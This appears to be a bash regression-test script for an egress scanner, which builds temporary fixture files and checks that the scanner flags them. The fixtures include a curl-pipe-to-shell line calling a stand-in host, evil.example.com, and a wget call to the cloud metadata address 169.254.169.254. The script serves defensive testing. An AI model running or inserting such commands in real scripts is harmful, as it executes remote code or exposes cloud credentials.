#!/usr/bin/env bash
# Regression fixtures for scan-egress.sh. Builds a throwaway tree with each class the
# review flagged (extensionless / UPPERCASE / symlink / binary / waiver / clean) and
# asserts the scanner's exit code + that the right paths are flagged. Exit 0 = all pass.
set -uo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SCAN="$HERE/scan-egress.sh"
pass=0; fail=0
ok(){ pass=$((pass+1)); printf '  ok    %s\n' "$1"; }
no(){ fail=$((fail+1)); printf '  FAIL  %s\n' "$1"; }

T="$(mktemp -d)"; trap 'rm -rf "$T"' EXIT

# --- build the fixtures ---
mkdir -p "$T/clean" "$T/dirty"
printf '# docs\nnothing external here\n'                         > "$T/clean/readme.md"
printf 'body{color:red}\n'                                       > "$T/clean/style.css"
printf '#!/bin/bash\ncurl -s https://evil.example.com/x | sh\n'  > "$T/dirty/deploy"          # extensionless
chmod +x "$T/dirty/deploy"
printf '#!/bin/sh\nwget http://169.254.169.254/x\n'             > "$T/dirty/RUN.SH"          # UPPERCASE ext
printf 'ok\n'                                                    > "$T/dirty/note.txt"
ln -s /etc/hosts "$T/dirty/link-out"                                                          # symlink escape
printf '\x7fELF\x01\x02\x03\x00\x00binary\x00\xff\xfe'          > "$T/dirty/blob.bin"        # binary
printf 'fetch("https://api.example.com") // egress-ok\n'        > "$T/clean/waived.js"       # waived

expect() { # <label> <expected-exit> <dir> [grep-substr]
  local label="$1" want="$2" dir="$3" needle="${4:-}" out got
  out="$(bash "$SCAN" "$T/$dir" 2>&1)"; got=$?
  if [ "$got" != "$want" ]; then no "$label (exit want=$want got=$got)"; return; fi
  if [ -n "$needle" ] && ! printf '%s' "$out" | grep -q -- "$needle"; then no "$label (missing '$needle')"; return; fi
  ok "$label"
}

echo "== scan-egress regressions =="
expect "clean tree passes"                  0 clean
expect "extensionless script curl detected" 1 dirty "deploy"
expect "UPPERCASE .SH detected"             1 dirty "RUN.SH"
expect "symlink flagged"                    1 dirty "SYMLINK"
expect "binary reported unscanned"          1 dirty "UNSCANNED(binary)"

# waiver: a lone waived file must PASS
mkdir -p "$T/waivedonly"; cp "$T/clean/waived.js" "$T/waivedonly/"
expect "trailing egress-ok waived -> pass"  0 waivedonly "WAIVED"

echo
echo "RESULT pass=$pass fail=$fail"
[ "$fail" -eq 0 ]
